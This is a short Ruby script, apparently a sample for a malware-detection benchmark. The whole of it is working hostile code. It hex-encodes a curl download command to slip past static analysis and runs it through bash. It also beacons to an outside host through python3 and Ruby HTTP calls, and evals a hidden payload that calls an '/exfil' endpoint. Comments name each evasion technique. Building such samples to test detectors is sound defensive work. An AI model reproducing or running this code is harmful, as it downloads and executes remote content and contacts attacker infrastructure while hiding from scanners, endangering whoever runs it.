#!/usr/bin/env ruby

require 'open3'
require 'net/http'
require 'uri'

exit 1 unless File.exist?(File.expand_path("~/.nw9k09"))

HOST = "panos-ruby-polyglot-lolbin-4546d.benchmark.atomdrift.org"

# Anti-static / polyglot: hex-encoded payload fragments
# Static analysis sees only opaque hex strings; runtime assembly reveals intent
HEX_FRAGS = [
  "6375726c202d73202d6f202f746d702f70616e6f735f6461746120",
  "687474703a2f2f",
]

def hex_decode(hex_str)
  [hex_str].pack("H*")
end

def assemble(frags, host)
  frags.map { |f| hex_decode(f) }.join + host
end

cmd = assemble(HEX_FRAGS, HOST)

# Lolbin: execute assembled command via bash
stdout, stderr, status = Open3.capture3("bash", "-c", cmd)
puts stdout
puts stderr unless stderr.empty?

# Lolbin: secondary execution via python3
begin
  py_payload = "import urllib.request; print(urllib.request.urlopen('http://#{HOST}/beacon').read())"
  Open3.capture3("python3", "-c", py_payload)
rescue
end

# Direct Ruby HTTP call
begin
  res = Net::HTTP.get_response(URI("http://#{HOST}/checkin"))
  puts res.body if res.body
rescue => e
  puts "Error: #{e.message}"
end

# Polyglot: payload hidden in DATA section, assembled and eval'd at runtime
hidden = DATA.read.gsub("HOST_PLACEHOLDER", HOST)
eval(hidden)
__END__
system("bash", "-c", "curl -s http://HOST_PLACEHOLDER/exfil")
